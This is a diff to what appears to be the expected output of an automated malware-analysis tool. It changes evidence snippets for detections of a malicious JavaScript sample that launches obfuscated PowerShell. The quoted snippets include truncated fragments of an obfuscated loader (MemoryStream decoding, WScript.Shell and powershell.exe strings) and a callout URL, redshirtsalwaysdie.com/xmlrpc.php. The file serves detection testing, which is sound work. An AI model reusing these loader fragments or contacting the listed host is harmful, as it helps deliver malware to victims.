@@ -136,7 +136,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript uses a MemoryStream object to manipulate memory\n\t\tfunction pVsfJUP($zViavV){$iKxAK = [SyStEm.iO.memOrySTReaM]::nEW()",
+        "body": "JavaScript uses a MemoryStream object to manipulate memory\n\t\tn = ?function pxny($TlOIlxX){$HmsGlo=\"56139C9225\";function pVsfJUP($zViavV){$iKxAK = [SyStEm.iO.memO...\n\t\tfunction pVsfJUP($zViavV){$iKxAK = [SyStEm.iO.memOrySTReaM]::nEW()",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -160,7 +160,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs PowerShell via powershell.exe\n\t\t-rEpLaCE \"\\^\",\"\");}}whilE(1){trY{pxny(@(\"https://redshirtsalwaysdie.com/xmlrpc.php\",\"https://edelson...\n\t\tN=?sLeEpScriptfullNamEFuLLnaMEPowERsHeLL.EXelastIndexOfcscriptWSCRIPT.SHElLsearchCREATEOBjECT\\\\CsCrI...",
+        "body": "JavaScript runs PowerShell via powershell.exe\n\t\tn = ?function pxny($TlOIlxX){$HmsGlo=\"56139C9225\";function pVsfJUP($zViavV){$iKxAK = [SyStEm.iO.memO...\n\t\tN=?sLeEpScriptfullNamEFuLLnaMEPowERsHeLL.EXelastIndexOfcscriptWSCRIPT.SHElLsearchCREATEOBjECT\\\\CsCrI...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -184,7 +184,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs PowerShell to call out to a URI\n\t\t-rEpLaCE \"\\^\",\"\");}}whilE(1){trY{pxny(@(\"https://redshirtsalwaysdie.com/xmlrpc.php\",\"https://edelson...",
+        "body": "JavaScript runs PowerShell to call out to a URI\n\t\tn = ?function pxny($TlOIlxX){$HmsGlo=\"56139C9225\";function pVsfJUP($zViavV){$iKxAK = [SyStEm.iO.memO...",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
